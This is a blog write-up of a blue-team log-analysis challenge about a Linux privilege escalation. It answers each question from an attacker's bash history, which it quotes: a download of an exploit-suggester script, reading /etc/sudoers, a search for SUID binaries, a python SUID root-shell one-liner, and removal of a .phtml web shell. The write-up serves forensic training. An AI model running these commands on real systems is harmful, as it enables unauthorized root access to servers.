---
layout: post
title: Log Analysis - Privilege Escalation
date: '2023-10-06 11:11:46 +0300'
image: /assets/img/cover_images/14.png
categories: [BTLO, CTF-Like]
tags: [Texteditor, Bash History]
---

## Log Analysis - Privilege Escalation
A server with sensitive data was accessed by an attacker and the files were posted on an underground forum. This data was only available to a privileged user, in this case the ‘root’ account. Responders say ‘www-data’ would be the logged in user if the server was remotely accessed, and this user doesn’t have access to the data. The developer stated that the server is hosting a PHP-based website and that proper filtering is in place to prevent php file uploads to gain malicious code execution. The bash history is provided to you but the recorded commands don’t appear to be related to the attack. Can you find what actually happened? 

## What user (other than ‘root’) is present on the server?

Let's open the files of bash_history

```bash
cd /home
ls
cd /home/daniel/
ls -la
su root
```

## What script did the attacker try to download to the server? 

We can see the script from bash_history
```bash
cd /tmp
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
env
ps -aux
```

## What packet analyzer tool did the attacker try to use?

We can see the packet analyzer from bash_history
```bash
iptables -L
lsof -i
tcpdump
last
cat /etc/sudoers
```

## What file extension did the attacker use to bypass the file upload filter implemented by the developer?

We can see the file extension from bash_history
```bash
find / -type f -user root -perm -4000 2>/dev/null
./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
rm /var/www/html/uploads/x.phtml
```

## Based on the commands run by the attacker before removing the php shell, what misconfiguration was exploited in the ‘python’ binary to gain root-level access? 1- Reverse Shell ; 2- File Upload ; 3- File Write ; 4- SUID ; 5- Library load

Based on the bash history we can see the attacker was searching for [SUID](https://gtfobins.github.io/) binaries and he was able to locate /bin/sh which he exploited with python
```bash
find / -type f -user root -perm -4000 2>/dev/null
./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```